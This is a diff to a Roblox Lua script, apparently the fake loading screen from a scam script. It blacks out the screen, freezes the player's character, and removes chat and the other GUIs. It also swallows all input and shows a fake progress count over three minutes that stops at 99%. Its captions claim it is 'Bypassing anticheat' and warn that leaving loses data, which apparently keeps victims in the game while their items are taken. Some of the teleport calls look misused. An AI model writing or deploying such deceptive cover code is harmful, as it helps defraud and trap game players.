@@ -1,95 +1,148 @@
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local TextChatService = game:GetService("TextChatService")
+local CoreGui = game:GetService("CoreGui")
+local TeleportService = game:GetService("TeleportService")
 
--- Remove all existing ScreenGuis
-for _, gui in pairs(playerGui:GetChildren()) do
-	if gui:IsA("ScreenGui") then
-		gui:Destroy()
-	end
+local function SetupLoadingScreen()
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    if playerGui:FindFirstChild("FullCoverLoading") then
+        playerGui.FullCoverLoading:Destroy()
+    end
+
+    local function disableMovement()
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = 0
+            humanoid.JumpPower = 0
+        end
+    end
+
+    disableMovement()
+    player.CharacterAdded:Connect(disableMovement)
+
+    for _, gui in pairs(playerGui:GetChildren()) do
+        if gui:IsA("ScreenGui") and gui.Name ~= "FullCoverLoading" then
+            gui.Enabled = false
+        end
+    end
+
+    playerGui.ChildAdded:Connect(function(child)
+        if child:IsA("ScreenGui") and child.Name ~= "FullCoverLoading" then
+            child.Enabled = false
+        end
+    end)
+
+    pcall(function()
+        if TextChatService:FindFirstChild("ChatWindowConfiguration") then
+            TextChatService.ChatWindowConfiguration.Enabled = false
+        end
+    end)
+
+    pcall(function()
+        if CoreGui:FindFirstChild("Chat") then
+            CoreGui.Chat:Destroy()
+        end
+    end)
+
+    CoreGui.ChildAdded:Connect(function(child)
+        if child.Name == "Chat" then
+            child:Destroy()
+        end
+    end)
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "FullCoverLoading"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    screenGui.Parent = playerGui
+
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    background.ZIndex = 10000
+    background.Parent = screenGui
+
+    local loadingText = Instance.new("TextLabel")
+    loadingText.Size = UDim2.new(1, 0, 0.1, 0)
+    loadingText.Position = UDim2.new(0, 0, 0.4, 0)
+    loadingText.BackgroundTransparency = 1
+    loadingText.TextColor3 = Color3.new(1, 1, 1)
+    loadingText.Font = Enum.Font.SourceSansLight
+    loadingText.TextScaled = true
+    loadingText.Text = "Loading.. 0%"
+    loadingText.ZIndex = 10001
+    loadingText.Parent = background
+
+    local bypassText = Instance.new("TextLabel")
+    bypassText.Size = UDim2.new(1, 0, 0.05, 0)
+    bypassText.Position = UDim2.new(0, 0, 0.5, 0)
+    bypassText.BackgroundTransparency = 1
+    bypassText.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+    bypassText.Font = Enum.Font.SourceSans
+    bypassText.TextScaled = true
+    bypassText.Text = "Bypassing anticheat... please wait"
+    bypassText.ZIndex = 10001
+    bypassText.Parent = background
+
+    local warningText = Instance.new("TextLabel")
+    warningText.Size = UDim2.new(1, 0, 0.05, 0)
+    warningText.Position = UDim2.new(0, 0, 0.55, 0)
+    warningText.BackgroundTransparency = 1
+    warningText.TextColor3 = Color3.new(0.8, 0.2, 0.2)
+    warningText.Font = Enum.Font.SourceSans
+    warningText.TextScaled = true
+    warningText.Text = "Wait for the loading screen to load. Don't leave, or you'll lose your data."
+    warningText.ZIndex = 10001
+    warningText.Parent = background
+
+    local creditText = Instance.new("TextLabel")
+    creditText.Size = UDim2.new(1, 0, 0.04, 0)
+    creditText.Position = UDim2.new(0, 0, 0.6, 0)
+    creditText.BackgroundTransparency = 1
+    creditText.TextColor3 = Color3.new(0.6, 0.6, 0.6)
+    creditText.Font = Enum.Font.SourceSans
+    creditText.TextScaled = true
+    creditText.Text = "by vanz."
+    creditText.ZIndex = 10001
+    creditText.Parent = background
+
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        return Enum.ContextActionResult.Sink
+    end)
+
+    local totalTime = 180
+    local steps = 100
+    for i = 1, steps - 1 do
+        task.wait(totalTime / steps)
+        loadingText.Text = "Loading.. " .. i .. "%"
+    end
+ 
+    loadingText.Text = "Loading.. 99%"
 end
 
--- Create loading screen GUI
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "LoadingScreen"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = playerGui
+SetupLoadingScreen()
 
--- Background
-local bg = Instance.new("Frame")
-bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-bg.Parent = screenGui
-
--- Loading bar background
-local barBG = Instance.new("Frame")
-barBG.Size = UDim2.new(0.6, 0, 0.05, 0)
-barBG.Position = UDim2.new(0.2, 0, 0.5, 0)
-barBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-barBG.BorderSizePixel = 0
-barBG.Parent = bg
-
--- Loading bar fill
-local barFill = Instance.new("Frame")
-barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-barFill.BorderSizePixel = 0
-barFill.Parent = barBG
-
--- Percent text
-local percentText = Instance.new("TextLabel")
-percentText.Size = UDim2.new(0.1, 0, 0.05, 0)
-percentText.Position = UDim2.new(0.81, 0, 0.5, 0)
-percentText.BackgroundTransparency = 1
-percentText.TextColor3 = Color3.new(1, 1, 1)
-percentText.Font = Enum.Font.SourceSansBold
-percentText.TextSize = 24
-percentText.Text = "0%"
-percentText.Parent = bg
-
--- Messages
-local messages = {
-	"Bypassing anti-cheat...",
-	"Copying your pets...",
-	"Checking if script is online...",
-	"Analyzing backpack contents...",
-	"Scanning server...",
-	"Gathering session info...",
-	"Confirming connection...",
-	"Decrypting banana...",
-	"Calculating trustworthiness...",
-	"Loading memes..."
-}
-
-local messageLabel = Instance.new("TextLabel")
-messageLabel.Size = UDim2.new(0.6, 0, 0.05, 0)
-messageLabel.Position = UDim2.new(0.2, 0, 0.58, 0)
-messageLabel.BackgroundTransparency = 1
-messageLabel.TextColor3 = Color3.new(1, 1, 1)
-messageLabel.Font = Enum.Font.SourceSansItalic
-messageLabel.TextSize = 22
-messageLabel.Text = ""
-messageLabel.Parent = bg
-
-local messageIndex = 1
-
--- Cycle messages every 3 seconds
-spawn(function()
-	while true do
-		messageLabel.Text = messages[messageIndex]
-		messageIndex = messageIndex + 1
-		if messageIndex > #messages then
-			messageIndex = 1
-		end
-		wait(3)
-	end
-end)
-
--- Fill bar from 0 to 100 with 2 seconds per 1%
-for i = 1, 100 do
-	barFill.Size = UDim2.new(i / 100, 0, 1, 0)
-	percentText.Text = i .. "%"
-	wait(2)
+local function OnPlayerAdded(player)
+    if player == Players.LocalPlayer then
+        SetupLoadingScreen()
+    end
 end
 
--- Stay on 100%, do nothing further
+Players.PlayerAdded:Connect(OnPlayerAdded)
+
+local function OnTeleport()
+    local teleportData = {
+        loadingScript = true
+    }
+    TeleportService:SetTeleportGui(teleportData)
+end
+
+TeleportService.LocalPlayerTeleporting:Connect(OnTeleport)
+TeleportService.TeleportInitiated:Connect(OnTeleport)
